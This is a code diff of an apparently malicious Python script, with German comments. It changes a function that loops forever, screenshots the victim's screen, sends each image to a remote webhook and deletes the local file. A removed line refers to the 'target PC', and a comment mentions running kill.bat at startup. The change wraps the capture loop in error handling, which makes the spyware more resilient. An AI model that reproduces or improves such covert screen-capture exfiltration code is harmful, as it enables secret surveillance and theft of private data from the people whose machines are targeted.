@@ -198,22 +198,26 @@ def send_to_webhook_pic(filename):
 
 def screenshot():
     while True:
-        print("Taking screenshot...")  # Debug print
-        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        filename = f"screen_{now}.png"
+        try:
+            print("Taking screenshot...")  
+            now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            filename = f"screen_{now}.png"
 
-        screenshotpng = pyautogui.screenshot()
-        screenshotpng.save(filename)
+            screenshotpng = pyautogui.screenshot()
+            screenshotpng.save(filename)
 
-        print(f"Screenshot saved as {filename}")  # Debug print
+            print(f"Screenshot saved as {filename}")  
 
-        send_to_webhook_pic(filename)
-        timee.sleep(1)
-        os.remove(filename)
-        print(f"Deleted {filename}")
-        send_to_webhook_pic(f"Deleted {filename} on target PC")
+            send_to_webhook_pic(filename)
+            time.sleep(1)  # Warten, bevor die Datei gelöscht wird
 
-        time.sleep(5)
+            os.remove(filename)
+            print(f"Deleted {filename}")
+
+        except Exception as e:
+            print(f"Error in screenshot function: {e}")
+
+        time.sleep(5)  # Wartezeit vor dem nächsten Screenshot
 
 
 # Run kill.bat file at the start
